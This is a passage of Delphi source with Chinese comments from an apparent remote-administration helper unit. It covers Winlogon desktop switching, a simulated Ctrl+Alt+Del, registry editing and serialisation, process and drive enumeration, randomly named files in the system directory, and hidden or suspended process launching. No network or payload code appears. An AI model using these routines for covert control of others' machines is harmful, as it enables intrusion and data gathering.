  key:='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon';
  szVal:='ShutdownWithoutLogon';
  szData:='0';cbData:=strlen(szData)+1;

  err:=RegCreatekeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS,nil,hk,nil);
  if err<>ERROR_SUCCESS then exit;
  err:=RegSetValueExA(hk,szVal,0,dwType,Data,cbData);
  RegCloseKey(hk);
  if err<>ERROR_SUCCESS then exit;

  result:=true;
end;
procedure SendHokKey;stdcall;
var
HDesk_WL: HDESK;
begin
HDesk_WL := OpenDesktopA ('Winlogon', 0, False, DESKTOP_JOURNALPLAYBACK);
if (HDesk_WL <> 0) then
if (SetThreadDesktop (HDesk_WL) = True) then
PostMessage(HWND_BROADCAST, $0312, 0, MAKELONG (MOD_ALT or MOD_CONTROL, VK_DELETE));
end;
//*********************************************Reg********************************
function RegDelVal(rk:HKEY;key,val:pansiChar):bool;
var
  ro:stregopinfo;
begin
  ro.op:=RDelVal;
  ro.rk:=rk;
  strcopy(ro.key,key);
  strcopy(ro.val,val);
  result:=opreg(ro);
end;
function RegSetInt(rk:HKEY;key,val:pansiChar;i:Integer):bool;
var
  ro:stregopinfo;
begin
  ro.op:=RCreateVal;
  ro.rk:=rk;
  strcopy(ro.key,key);
  strcopy(ro.val,val);
  ro.typ:=REG_DWORD;
  ro.dat:=@i;
  ro.siz:=sizeof(i);
  result:=opreg(ro);
end;
function RegGetInt(rk:HKEY;key,val:pansiChar):integer;
var
  ro:stregopinfo;
begin
  ro.op:=RGetVal;
  ro.rk:=rk;
  strcopy(ro.key,key);
  strcopy(ro.val,val);
  ro.typ:=REG_DWORD;
  ro.dat:=@result;
  ro.siz:=sizeof(integer);
  if not opreg(ro) then result:=-1;
end;
function RegGetStr(rk:HKEY;key,val,dat:pansiChar):pansiChar;
var
  ro:stregopinfo;
  buf:array[0..1023] of ansiChar;
begin
  buf:='';result:=dat;
  ro.op:=RGetVal;
  ro.rk:=rk;
  strcopy(ro.key,key);
  strcopy(ro.val,val);
  ro.typ:=REG_SZ;
  ro.dat:=@buf;
  ro.siz:=sizeof(buf);
  if opreg(ro) then
    strcopy(dat,buf)
  else
   result:=nil;
end;
function RegGetString(rk:HKEY;key,val:pansiChar):string;
var
  ro:stregopinfo;
  data:array[0..1023] of ansiChar;
begin
  result:='';
  ro.op:=RGetVal;
  ro.rk:=rk;
  strcopy(ro.key,key);
  strcopy(ro.val,val);
  ro.typ:=REG_SZ;
  ro.dat:=@data[0];
  ro.siz:=sizeof(data);
  if opreg(ro) then
    result:=String(data);
end;
function RegValExist(rk:HKEY;key,val:pansiChar):BOOL;
var
  op:stRegOpInfo;
  Data:array[0..1023] of ansiChar;
begin
  op.op:=RGetVal;
  op.rk:=rk;
  strcopy(op.key,key);
  strcopy(op.val,val);
  op.typ:=REG_SZ;
  op.dat:=@Data[0];
  op.siz:=sizeof(Data);
  result:=opReg(op);
end;
function GetRegyh(rk:HKEY;key:pansiChar):string;
//06-08-15
var
  err,i:integer;
  hk:hkey;
  cSubKeys,cbMaxSubKeyLen,cVals,cbMaxValNameLen,cbMaxValLen:DWORD;
  cbSubKeyLen,cbValNameLen,cbValLen:DWORD;
  pb:pointer;
  valueName:array[0..max_path-1] of ansiChar;
  subkeysLen,dwType:DWORD;
begin
  result:='';hk:=0;pb:=nil;cbMaxValNameLen:=0;cbMaxValLen:=0;
try
  err:=RegOpenKeyExA(rk,key,0,KEY_ALL_ACCESS,hk);
  if err<>ERROR_SUCCESS then exit;
  err:=RegQueryInfoKeyA(hk,nil,nil,nil,@cSubKeys,@cbMaxSubKeyLen,nil,@cVals,@cbMaxValNameLen,@cbMaxValLen,nil,nil);
  if err<>ERROR_SUCCESS then exit;
  if cbMaxValNameLen>0 then inc(cbMaxValNameLen);

  if cVals>0 then
  begin
    pb:=virtualAlloc(nil,cbMaxValLen,MEM_COMMIT,PAGE_READWRITE);
    if pb=nil then exit;
    for i:=0 to cVals-1 do
    begin
      zeromemory(@ValueName,sizeof(valueName));
      zeromemory(pb,cbMaxValLen);
      cbValNameLen:=cbMaxValNameLen;
      cbValLen:=cbMaxValLen;
      RegEnumValueA(hk,i,ValueName,cbValNameLen,nil,@dwType,pb,@cbValLen);
      if err<>ERROR_SUCCESS then exit;
      if dwType=REG_SZ then
      begin
        //if lstrcmpi(Valuename,'PCName')=0 then continue;
        //if lstrcmpi(Valuename,'user')=0 then continue;
        result:=result+pansiChar(pb)+';';
      end;
    end;//for
  end;//if cVals>0 then
finally
  if hk<>0 then RegCloseKey(hk);
  if (pb<>nil)and(cbMaxValLen>0) then
  begin
    virtualFree(pb,cbMaxValLen,MEM_DECOMMIT);
    virtualFree(pb,0,MEM_RELEASE);
  end;
end;
end;
function GetRegKeys(rk:HKEY;key:pansiChar;pData:pointer;var size:cardinal):bool;
label 1;
var
  err,i:integer;
  hk:hkey;
  cSubKeys,cbMaxSubKeyLen,cVals,cbMaxValNameLen,cbMaxValLen:DWORD;
  cbSubKeyLen,cbValNameLen,cbValLen:DWORD;
  p:pointer;
  pd:PDWORD;
  pc:pansiChar;
  pb:pointer;
  valueName:array[0..max_path-1] of ansiChar;
  subkeysLen,dwType:DWORD;
  //数据值结构：1、值名称长度；2、数据类型；3、数据长度；4、值名称；5、数据
  //数据流结构：1、子键数目；2、最大子键长度；3值数目；4、最大值名长度；5、最大数据长度；
  //6、子键列表大小；7、子键列表；8、值长度；9、值类型；10、数据长度；11、值名称；12、数据；
begin
  result:=false;
  P:=pData;
  err:=RegOpenKeyExA(rk,key,0,KEY_ALL_ACCESS,hk);
  if err<>ERROR_SUCCESS then exit;
  err:=RegQueryInfoKeyA(hk,nil,nil,nil,@cSubKeys,@cbMaxSubKeyLen,nil,@cVals,@cbMaxValNameLen,@cbMaxValLen,nil,nil);
  if cbMaxSubKeyLen>0 then inc(cbMaxSubKeyLen);
  if cbMaxValNameLen>0 then inc(cbMaxValNameLen);
  if err<>ERROR_SUCCESS then goto 1;
  if p=nil then
  begin
    size:=cSubKeys*cbMaxSubKeyLen+cVals*cbMaxValNameLen+cVals*cbMaxValLen;
    goto 1;
  end;//p=nil
  //子键数目:
  pd:=PDWORD(p);pd^:=cSubKeys;p:=pointer(DWORD(p)+sizeof(DWORD));
  //最大子键长度:
  pd:=PDWORD(p);pd^:=cbMaxSubKeyLen;p:=pointer(DWORD(p)+sizeof(DWORD));
  //值数目:
  pd:=PDWORD(p);pd^:=cVals;p:=pointer(DWORD(p)+sizeof(DWORD));
  //最大值名长度:
  pd:=PDWORD(p);pd^:=cbMaxValNameLen;p:=pointer(DWORD(p)+sizeof(DWORD));
  //最大数据长度:
  pd:=PDWORD(p);pd^:=cbMaxValLen;p:=pointer(DWORD(p)+sizeof(DWORD));
  //子键列表大小：
  subKeysLen:=0;
  pd:=PDWORD(p);pd^:=subKeysLen;p:=pointer(DWORD(p)+sizeof(DWORD));
  //子键列表：
  if cSubkeys>0 then
  begin
    for i:=0 to cSubKeys-1 do
    begin
      pc:=pansiChar(p);
      cbSubKeyLen:=cbMaxSubKeyLen;
      RegEnumKeyExA(hk,i,pc,cbSubKeyLen,nil,nil,nil,nil);
      strcat(pc,#13#10);
      p:=pointer(DWORD(p)+cbSubKeyLen+2);
    end;
    strcat(pc,#0);
    p:=pointer(DWORD(p)+sizeof(#0));
    //子键列表大小：
    subkeysLen:=DWORD(p)-DWORD(pd)-sizeof(DWORD);
    pd^:=subkeysLen;
  end; //if cSubkeys

  if cVals>0 then
  begin
    pb:=virtualAlloc(nil,cbMaxValLen,MEM_COMMIT,PAGE_READWRITE);
    for i:=0 to cVals-1 do
    begin
      zeromemory(@ValueName,sizeof(valueName));
      cbValNameLen:=cbMaxValNameLen;
      cbValLen:=cbMaxValLen;
      RegEnumValueA(hk,i,ValueName,cbValNameLen,nil,@dwType,pb,@cbValLen);
      //值长度：
      pd:=PDWORD(p);pd^:=cbValNameLen;p:=pointer(DWORD(p)+sizeof(DWORD));
      //值类型：
      pd:=PDWORD(p);pd^:=dwType;p:=pointer(DWORD(p)+sizeof(DWORD));
      //数据长度：
      pd:=PDWORD(p);pd^:=cbValLen;p:=pointer(DWORD(p)+sizeof(DWORD));
      //值名称：
      copymemory(p,@ValueName,cbValNameLen+1);p:=pointer(cbValNameLen+1+DWORD(p));
      //数据：
      copymemory(p,pb,cbValLen);p:=pointer(cbValLen+DWORD(p));
    end;//for
    virtualFree(pb,cbMaxValLen,MEM_DECOMMIT);
    virtualFree(pb,0,MEM_RELEASE);
  end;//if cVals>0 then
  //返回块的实际大小：
  size:=DWORD(P)-DWORD(pData);
  result:=true;
1:
  RegCloseKey(hk);
end;
function RenameRegKey(rk:HKEY;oldKey,newkey:pansiChar):BOOL;
var
//setBackupAndRestorePriviliges
  hk:HKEY;
  FileName:array[0..max_path-1] of ansiChar;
  str:array[0..31] of ansiChar;
  err:integer;
begin
  result:=false;
  err:=RegOpenKeyExA(rk,oldKey,0,KEY_ALL_ACCESS,hk);
  if err<>ERROR_SUCCESS then exit;
  GetSystemDirectoryA(FileName,sizeof(FileName));
  strFromTime(str);strcat(FileName,'\');strcat(FileName,str);
  err:=RegSaveKeyA(hk,FileName,nil);
  if err<>ERROR_SUCCESS then begin RegCloseKey(hk);windows.DeleteFileA(FileName);exit;end;
  RegCloseKey(hk);
  err:=RegOpenKeyExA(rk,newkey,0,KEY_ALL_ACCESS,hk);
  if err<>error_file_not_found then begin RegCloseKey(hk);windows.DeleteFileA(FileName);exit;end;
  err:=RegCreateKeyExA(rk,newkey,0,nil,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,
    nil,hk,nil);
  if err<>ERROR_SUCCESS then begin windows.DeleteFileA(FileName);exit;end;
  result:=RegRestoreKeyA(hk,FileName,0)=ERROR_SUCCESS;
  if result then result:=DelRegKey(rk,oldKey);
  windows.DeleteFileA(FileName);
end;
function ReNameRegVal(rk:HKEY;key,oldVal,newVal:pansiChar):BOOL;
var
  RegType,cbData:Cardinal;
  Data:pointer;
  err:integer;
  hk:HKEY;
begin
  result:=false;
  err:=RegOpenKeyExA(rk,key,0,KEY_ALL_ACCESS,hk);
  if err<>ERROR_SUCCESS then exit;
  err:=RegQueryValueExA(hk,oldVal,nil,@RegType,nil,@cbData);
  if err<>ERROR_SUCCESS then begin RegCloseKey(hk);exit;end;
  getmem(Data,cbData);
  err:=RegQueryValueExA(hk,oldVal,nil,@RegType,Data,@cbData);
  if err<>ERROR_SUCCESS then begin RegCloseKey(hk);freemem(Data);exit;end;
  err:=RegDeleteValueA(hk,oldVal);
  if err<>ERROR_SUCCESS then begin RegCloseKey(hk);freemem(Data);exit;end;
  err:=RegSetValueExA(hk,newVal,0,RegType,Data,cbData);
  result:=err=ERROR_SUCCESS;
  RegCloseKey(hk);freemem(Data);
end;
function DelRegKey(rk:HKEY;key:pansiChar):BOOL;
var
  err:integer;
  Index,cbName:cardinal;
  hk:HKEY;
  name:array[0..255] of ansiChar;
begin
  result:=false;
  err:=RegOpenKeyExA(rk,key,0,KEY_ALL_ACCESS,hk);
  if err<>ERROR_SUCCESS then exit;
  Index:=0;cbName:=sizeof(name);
  err:=RegEnumKeyExA(hk,Index,name,cbName,nil,nil,nil,nil);
  while err=ERROR_SUCCESS do
  begin
    DelRegKey(hk,name);//Inc(Index);
    cbName:=sizeof(name);
    err:=RegEnumKeyExA(hk,Index,name,cbName,nil,nil,nil,nil);
  end;//while
  RegCloseKey(hk);
  err:=RegDeleteKeyA(rk,key);
  result:=err=ERROR_SUCCESS;
end;
function OpReg(var ro:stRegOpInfo):bool;
var
  hk:HKEY;
  err:integer;
  p:pansiChar;
begin
  result:=false;
  with ro do
  begin
    case op of
    REnumKey:
      begin
        GetRegKeys(rk,key,nil,siz);
        dat:=virtualAlloc(nil,siz,MEM_COMMIT,PAGE_READWRITE);
        GetRegKeys(rk,key,dat,siz);
      end;//REnumKey
    REnumFree:
      begin
        virtualfree(ro.dat,ro.siz,MEM_DECOMMIT);
        virtualfree(ro.dat,0,MEM_RELEASE);
        ro.siz:=0;
      end;//REnumFree
    RCreateKey:
      begin
        result:=RegCreateKeyExA(rk,key,0,nil,REG_OPTION_NON_VOLATILE,
          KEY_ALL_ACCESS,nil,hk,nil)=ERROR_SUCCESS;
        RegCloseKey(hk);
      end;//RCreateKey
    RRenameKey:
      begin
        result:=RenameRegKey(ro.rk,ro.key,ro.val);
      end;// RRenameKey
    Rdelkey:
      begin
        result:=DelRegKey(ro.rk,ro.key);
      end;// Rdelkey
    RGetVal:
      begin
        err:=RegOpenKeyExA(rk,key,0,KEY_ALL_ACCESS,hk);
        if err<>ERROR_SUCCESS then exit;
        result:=RegQueryValueExA(hk,val,nil,@typ,PByte(dat),@siz)=ERROR_SUCCESS;
        RegCloseKey(hk);
      end;//RGetVal
    RCreateVal:
      begin
        err:=RegCreateKeyA(rk,key,hk);
        if err<>ERROR_SUCCESS then exit;
        result:=RegSetValueExA(hk,val,0,typ,dat,siz)=ERROR_SUCCESS;
        RegCloseKey(hk);
      end;//RCreateVal
    RrenameVal:
      begin
        p:=ro.val;p:=p+strlen(p)+1;
        result:=RenameRegVal(ro.rk,ro.key,ro.val,p);
      end;//RrenameVal
    RDelVal:
      begin
        err:=RegOpenKeyExA(rk,key,0,KEY_ALL_ACCESS,hk);
        if err<>ERROR_SUCCESS then exit;
        err:=RegDeleteValueA(hk,Val);result:=err=ERROR_SUCCESS;
        RegCloseKey(hk);
      end;//RDelVal
    end;//case
  end;//with
end;
function ClearDirThread(PDir:pointer):BOOL;stdcall;
//2006-03-17增加重启后删除文件功能。
var
  FileName:array[0..max_path-1] of ansiChar;
  FindFileData:WIN32_FIND_DATAA;
  hFindFile:thandle;
begin
  result:=false;
  strcopy(FileName,pansiChar(PDir));strcat(FileName,'\*.*');
  hFindFile:=FindFirstFileA(FileName,FindFileData);
  if hFindFile=INVALID_HANDLE_VALUE then exit;
  repeat
    strcopy(FileName,pansiChar(PDir));strcat(FileName,'\');strcat(FileName,findFileData.cFileName);
    if findFileData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY>0 then
    begin
      if findFileData.cFileName[0]='.' then continue;
      if findFileData.cFileName='RECYCLER' then continue;
      ClearDirThread(@FileName);
    end
    else begin
      SetFileAttributesA(FileName,FILE_ATTRIBUTE_ARCHIVE);
      if not windows.deleteFileA(FileName) then
        MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
    end;//文件
  until FindNextFileA(hFindFile,findFileData)=false;
  if not windows.FindClose(hFindFile) then
    MoveFileExA(FileName,nil,MOVEFILE_DELAY_UNTIL_REBOOT);
  result:=RemoveDirectoryA(pansiChar(PDir));
end;

function FileExist(FileName:pansiChar):BOOL;
var
  hFindFile:cardinal;
  FindData:WIN32_FIND_DATAA;
begin
  result:=false;
  hFindFile:=FindFirstFileA(FileName,FindData);
  if hFindFile=INVALID_HANDLE_VALUE then exit
  else FindClose(hFindFile);
  result:=true;
end;

function GenUniqueFileName(const ext:string):string;
var
  i,r,o:integer;
  Buf:array[0..max_path-1] of wideChar;
  sysDir,FileName:string;
begin
  GetSystemDirectoryW(Buf,sizeof(Buf));
  SysDir:=Buf;
  Randomize;
  repeat
    FileName:='';
    for i:=0 to 3 do
    begin
      r:=random(25);
      o:=r+97;
      FileName:=FileName+ansiChar(o);
    end;
    FileName:=FileName+ext;
    result:=SysDir+'\'+FileName;
  until not FileExist(pansiChar(result));
end;
function RegComFile(FileName:pansiChar;bReg:bool):bool;
var
  DLL:THandle;
  RegFunc:function:HResult;
begin
  result:=false;
  DLL:=LoadLibraryA(FileName);
  if DLL=0 then exit;
  if bReg then
    @RegFunc:=GetProcAddress(DLL,'DllRegisterServer')
  else
    @RegFunc:=GetProcAddress(DLL,'DllUnregisterServer');
  if @RegFunc<>nil then
  if RegFunc>=0 then result:=true;
  FreeLibrary(DLL);
end;
{
function RegComFile(FileName:pWideansiChar;bReg:bool):bool;
var
  DLL:THandle;
  RegFunc:function:HResult;
begin
  result:=false;
  DLL:=LoadLibraryw(FileName);
  if DLL=0 then exit;
  if bReg then
    @RegFunc:=GetProcAddress(DLL,'DllRegisterServer')
  else
    @RegFunc:=GetProcAddress(DLL,'DllUnregisterServer');
  if @RegFunc<>nil then
  if RegFunc>=0 then result:=true;
  FreeLibrary(DLL);
end;
}
function RunFile(name:pansiChar;ShowType:DWORD;suspended:BOOL=false;bCMD:BOOL=false):PROCESS_INFORMATION;
var
  si:STARTUPINFOA;
  suspend:dword;
begin
  si.cb:=sizeof(si);
  si.lpReserved:=nil;
  si.lpDesktop:=nil;     //window station and desktop
  si.lpTitle:=nil;      //console title
  si.dwX:=0;si.dwY:=0; //new window pos
  si.dwXSize:=0;si.dwYSize:=0;  //new window size
  //si.dwXCountansiChars:=0;si.dwYCountansiChars:=0;//console ansiCharacter columns rows
  si.dwFillAttribute:=0; //console text and background colors
  si.dwFlags:=STARTF_FORCEOFFFEEDBACK or STARTF_USESHOWWINDOW; //cursor off ;wShowWindow;
  si.wShowWindow:=ShowType;
  si.cbReserved2:=0;si.lpReserved:=nil;
  si.hStdInput:=0;si.hStdOutput:=0;si.hStdError:=0; //
  result.hProcess:=0;result.hThread:=0;result.dwProcessId:=0;result.dwThreadId:=0;
  if SUSPENDED then suspend:=CREATE_SUSPENDED else suspend:=0;

  if bCMD then
      CreateProcessA(nil,
        name,//lpCommandLine
        nil,     //lpProcessAttributes
        nil,     //lpThreadAttributes
        false,   //bIneritHandles
        suspend, //dwCreationFlags  CREATE_SUSPENDED
        nil,     //lpEnvironment
        nil,     //lpCurrentDirectory
        si,      //lpStartupInfo
        result)     //lpProcessInformation
  else
    CreateProcessA(name,
        nil,     //lpCommandLine
        nil,     //lpProcessAttributes
        nil,     //lpThreadAttributes
        false,   //bIneritHandles
        suspend, //dwCreationFlags  CREATE_SUSPENDED
        nil,     //lpEnvironment
        nil,     //lpCurrentDirectory
        si,      //lpStartupInfo
        result);     //lpProcessInformation
end;

function SwitchWSDT(WS,DT:PansiChar;var hOldWS: HWINSTA;var hOldDT: HDESK;Resume:bool=false):bool;stdcall;
const
  DEF_WS: PansiChar = 'WinSta0';        // current user window station
  LOGON_DT: PansiChar = 'WinLogon';         // winlogon desktop
  DEF_DT: PansiChar = 'Default';        // default desktop
var
  hNewWS: HWINSTA;
  hNewDT: HDESK;
begin
  result:=false;
  if Resume then
  begin
    if hOldWS<>0 then
    begin
      hNewWS := GetProcessWindowStation;
      if hOldWS<>hNewWS then
        SetProcessWindowStation(hOldWS);
      CloseWindowStation(hNewWS);
    end;// if hOldWS<>0 then
    if hOldDT<>0 then
    begin
      hNewDT := GetThreadDesktop (GetCurrentThreadID);
      if hNewDT<>hOldDT then
        SetThreadDesktop(hOldDT);
      CloseDesktop(hNewDT);
    end;//if hOldDT<>0 then
  end
  else begin
    GetDesktopWindow();
    hOldWS:=GetProcessWindowStation();
    hOldDT:= GetThreadDesktop(GetCurrentThreadId());
    hNewWS := 0;
    if WS=nil then
    begin
      hNewWS:=OpenWindowStationA(DEF_WS,FALSE,GENERIC_ALL);
    end
    else begin
      hNewWS:=OpenWindowStationA(WS,FALSE,GENERIC_ALL);
    end;
    if hNewWS=0 then exit;
    if not SetProcessWindowStation(hNewWS) then
    begin
      CloseWindowStation(hNewWS);
      Exit;
    end;
    if DT=nil then
    begin
      hNewDT:=OpenInputDesktop(0,FALSE,GENERIC_ALL);
    end
    else begin
      hNewDT:=OpenDesktopA(DT,0,FALSE,GENERIC_ALL);
    end;//if DT=nil then
    if hNewDT=0 then
    begin
      CloseWindowStation(hNewWS);
      Exit;
    end;//if hNewDT=0 then
    if not SetThreadDesktop(hNewDT) then
    begin
      CloseDesktop(hNewDT);
      CloseWindowStation(hNewWS);
      Exit;
    end;//if not SetThreadDesktop(hNewDT) then
  end;//not resume
result:=true;
end;
  {
function GetProcessesInfo98(var s:string;const showDLL:boolean=true):bool;
const
  TH32CS_SNAPPROCESS  = $00000002;
  TH32CS_SNAPMODULE   = $00000008;
  MAX_MODULE_NAME32 = 255;
type
  tagPROCESSENTRY32 = packed record
    dwSize: DWORD;
    cntUsage: DWORD;
    th32ProcessID: DWORD;       // this process
    th32DefaultHeapID: DWORD;
    th32ModuleID: DWORD;        // associated exe
    cntThreads: DWORD;
    th32ParentProcessID: DWORD; // this process's parent process
    pcPriClassBase: Longint;    // Base priority of process's threads
    dwFlags: DWORD;
    szExeFile: array[0..MAX_PATH - 1] of ansiChar;// Path
  end;
  TProcessEntry32 = tagPROCESSENTRY32;
  tagMODULEENTRY32 = record
    dwSize: DWORD;
    th32ModuleID: DWORD;  // This module
    th32ProcessID: DWORD; // owning process
    GlblcntUsage: DWORD;  // Global usage count on the module
    ProccntUsage: DWORD;  // Module usage count in th32ProcessID's context
    modBaseAddr: PBYTE;   // Base address of module in th32ProcessID's context
    modBaseSize: DWORD;   // Size in bytes of module starting at modBaseAddr
    hModule: HMODULE;     // The hModule of this module in th32ProcessID's context
    szModule: array[0..MAX_MODULE_NAME32] of ansiChar;
    szExePath: array[0..MAX_PATH - 1] of ansiChar;
  end;
  TModuleEntry32 = tagMODULEENTRY32;
  TCreateToolhelp32Snapshot = function (dwFlags, th32ProcessID: DWORD): THandle stdcall;
  TProcess32First = function (hSnapshot: THandle; var lppe: TProcessEntry32): BOOL stdcall;
  TProcess32Next = function (hSnapshot: THandle; var lppe: TProcessEntry32): BOOL stdcall;
  TModule32First = function (hSnapshot: THandle; var lpme: TModuleEntry32): BOOL stdcall;
  TModule32Next = function (hSnapshot: THandle; var lpme: TModuleEntry32): BOOL stdcall;
var
 ProcessSnapShotHandle: THandle;
 ProcessEntry: TProcessEntry32;
 ModuleSnapShotHandle: THandle;
 ModuleEntry: TModuleEntry32;
 bRet,bProcess:bool;
 KernelHandle: THandle;
 CreateToolhelp32Snapshot: TCreateToolhelp32Snapshot;
 Process32First: TProcess32First;
 Process32Next: TProcess32Next;
 Module32First: TModule32First;
 Module32Next: TModule32Next;
 k:integer;
 PID:array[0..8] of ansiChar;
begin
 result:=false;
 KernelHandle := GetModuleHandle('kernel32.dll');
 @CreateToolhelp32Snapshot := GetProcAddress(KernelHandle, 'CreateToolhelp32Snapshot');
 @Process32First := GetProcAddress(KernelHandle, 'Process32First');
 @Process32Next := GetProcAddress(KernelHandle, 'Process32Next');
 @Module32First := GetProcAddress(KernelHandle, 'Module32First');
 @Module32Next := GetProcAddress(KernelHandle, 'Module32Next');
 
 ProcessSnapShotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 if ProcessSnapShotHandle=-1 then exit;
 ProcessEntry.dwSize:=SizeOf(TProcessEntry32);
 bRet:=Process32First(ProcessSnapShotHandle, ProcessEntry);
 while bRet do
 begin
   ModuleSnapShotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ProcessEntry.th32ProcessID);
   if ModuleSnapShotHandle=-1 then continue;
   ModuleEntry.dwSize:=SizeOf(TModuleEntry32);
   bRet:=Module32First(ModuleSnapShotHandle, ModuleEntry);
   bProcess:=true;
   while bRet do
   begin
     if bProcess then
     begin
       inttostr(ProcessEntry.th32ProcessID,PID);
       for k:=strlen(PID) to 7 do PID[k]:=#32;
       s:=s+PID;
     end;
     bProcess:=false;
     s:=s+ModuleEntry.szExePath;s:=s+#13#10;
     if not ShowDLL then break;
     bRet:=Module32Next(ModuleSnapShotHandle, ModuleEntry);
   end;//while bRet do
   CloseHandle(ModuleSnapShotHandle);
   bRet:=Process32Next(ProcessSnapShotHandle, ProcessEntry);
 end;// while bRet do
 result:=true;
 CloseHandle(ProcessSnapShotHandle);
end;
}
function GetProcessesInfo2000(var s:string;const showDLL:boolean=true):bool;
//列举win2000进程及其DLL
label 1;
type
  tEnumProcesses=function (lpidProcess, cb, cbNeeded: DWORD):Integer; stdcall;
  tGetModuleFileNameExA=function (hProcess: THandle; HMODULE: HMODULE; lpFileName: PansiChar; nSize: DWORD):Integer; stdcall;
  tEnumProcessModules=function (hProcess: THandle; lphModule: HMODULE; cb, lpcbNeeded: DWORD):Integer; stdcall;
var
  EnumProcesses:tEnumProcesses;
  GetModuleFileNameExA:tGetModuleFileNameExA;
  EnumProcessModules:tEnumProcessModules;
  aProcesses,hMods: array[0..1024] of DWORD;
  DLL,hProcess,cbNeeded, cProcesses,cMod: DWORD;
  i,j,k:integer;
  sysDir,szFullName:array[0..max_path] of ansiChar;
  PID:array[0..8] of ansiChar;
begin
  result:=false;
  GetSystemDirectoryA(sysDir,sizeof(sysDir));
  DLL:=LoadLibrary('psapi.DLL');
  @EnumProcesses:=GetProcAddress(dll,'EnumProcesses'); //找到EnumProcesses的入口
  @EnumProcessModules:=GetProcAddress(dll,'EnumProcessModules');
  @GetModuleFileNameExA:=GetProcAddress(dll,'GetModuleFileNameExA');
  if (@EnumProcesses=nil) or (@EnumProcessModules=nil) or (@GetModuleFileNameExA=nil) then goto 1;
  if EnumProcesses(DWORD(@aProcesses), SizeOf(aProcesses), DWORD(@cbNeeded)) <> 0 then
  begin
    cProcesses := cbNeeded div SizeOf(DWORD);
    for I := 0 to cprocesses - 1 do
    begin
      hProcess := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ,
        False, aProcesses[i]);
      if EnumProcessModules(hProcess, DWORD(@hMods), SizeOf(hMods), DWORD(@cbNeeded)) <> 0 then
      begin
        cMod := cbNeeded div SizeOf(HMODULE);

        for j := 0 to (cMod - 1) do
        begin
        // Get the full path to the module's file.
          GetModuleFileNameExA(hProcess, hMods[j], szFullName, SizeOf(szFullName));
          if strpos(szFullName,'smss.exe')<>nil then
          begin
            strcopy(szFullName,sysDir);strcat(szFullName,'\smss.exe');
          end;
          if strpos(szFullName,'winlogon.exe')<>nil then
          begin
            strcopy(szFullName,sysDir);strcat(szFullName,'\winlogon.exe');
          end;
          if strpos(szFullName,'csrss.exe')<>nil then
          begin
            strcopy(szFullName,sysDir);strcat(szFullName,'\csrss.exe');
          end;
          //strcat(pansiChar(s),szFullName);strcat(pansiChar(s),#13#10);
          if j=0 then
          begin
            inttostr(aProcesses[i],PID);
            for k:=strlen(PID) to 7 do PID[k]:=#32;
            s:=s+PID;
          end;
          s:=s+szFullName+#13#10;
          if not showDLL then break;
        end;//for j := 0 to (cMod - 1) do
      end;//if enumProcessModules
      CloseHandle(hProcess);
    end;//for I :=
    result:=true;
  end;//if EnumProcesses(
1:
  FreeLibrary(DLL);
end;
function GetFileInfos(const dir,data:pansiChar):DWORD;
var
  i,k:integer;
  FileName:array[0..max_path-1] of ansiChar;
  hFindFile:dword;
  fileInfo:win32_find_dataA;
  p:pointer;
begin
  result:=0;
  p:=data;
  k:=sizeof(win32_find_data);
  strcopy(fileName,dir);
  strcat(fileName,'\*.*');
  i:=0;
  hFindFile:=FindFirstFileA(fileName,fileInfo);
  if hFindFile=INVALID_HANDLE_VALUE then exit;
  repeat
    if p<>nil then
    begin
      copymemory(p,@fileInfo,k);
      p:=pointer(DWORD(p)+k);
    end;
    inc(i);
  until FindNextFileA(hFindFile,fileInfo)=false;
  FindClose(hFindFile);
  result:=i*K;
end;
function GetDrvs(var Drvs:array of stDriveInfo):DWORD;
var
  c:ansiChar;
  s:array[0..3] of ansiChar;
  i:DWORD;
begin
  i:=0;
  for c:='A' to 'Z' do
  begin
    s[0]:=c;s[1]:=':';s[2]:='\';s[3]:=#0;
    case getdrivetypeA(s) of
    DRIVE_UNKNOWN:
      begin
      end;
    DRIVE_NO_ROOT_DIR:
      begin
      end;
    DRIVE_REMOVABLE:
      begin
        s[2]:=#0;
        strcopy(Drvs[i].name,s);
        Drvs[i].t:=DRIVE_REMOVABLE;
        i:=i+1;
      end;//DRIVE_REMOVABLE:
    DRIVE_FIXED:
      begin
        s[2]:=#0;
        strcopy(Drvs[i].name,s);
        Drvs[i].t:=DRIVE_FIXED;
        i:=i+1;
      end;//DRIVE_FIXED
    DRIVE_REMOTE:
      begin
        s[2]:=#0;
        strcopy(Drvs[i].name,s);
        Drvs[i].t:=DRIVE_REMOTE;
        i:=i+1;
      end;//DRIVE_REMOTE:
    DRIVE_CDROM:
      begin
        s[2]:=#0;
        strcopy(Drvs[i].name,s);
        Drvs[i].t:=DRIVE_CDROM;
        i:=i+1;
      end;// DRIVE_CDROM
    DRIVE_RAMDISK:
      begin
        s[2]:=#0;
        strcopy(Drvs[i].name,s);
        Drvs[i].t:=DRIVE_RAMDISK;
        i:=i+1;
      end;//DRIVE_RAMDISK
    end;//case
  end;//for
  result:=i;
end;
function GetScrSize(str:pansiChar):pansiChar;
var
  x,y:integer;
begin
  x:=GetSystemMetrics(SM_CXSCREEN);
  y:=GetSystemMetrics(SM_CYSCREEN);
  _wsprintf(str,'%dX%dY',[x,y]);
  Result :=str;
end;
function Getopentime(str:pansiChar):pansiChar;
var h,m,s:integer;
begin
  h:=(gettickcount div 1000) div 3600;
  s:=(gettickcount div 1000) mod 60;
  m:=(gettickcount div 1000) div 60-h*60;
  _wsprintf(str,'%d:%d:%d',[h,s,m]);
  result:=str;
end;
function GetPhymemery(str:pansiChar) :pansiChar;
var meminfo:memorystatus;
begin
  meminfo.dwLength :=sizeof(memorystatus);
  GlobalMemoryStatus(meminfo);
  inttostr(meminfo.dwTotalPhys div 1024,str);
  strcat(str,'KB');
  Result :=str;
end;
function SetInfoToReg(ro:stRegOpInfo):bool;
var
  hk:HKEY;
  err:integer;
begin
  result:=false;
  with ro do
  begin
    case op of
    RCreateVal:
      begin
        err:=RegCreateKeyA(rk,key,hk);
        if err<>ERROR_SUCCESS then exit;
        result:=RegSetValueExA(hk,val,0,typ,dat,siz)=ERROR_SUCCESS;
      end;//RCreateVal
    end;//case
  end;//with
end;
{
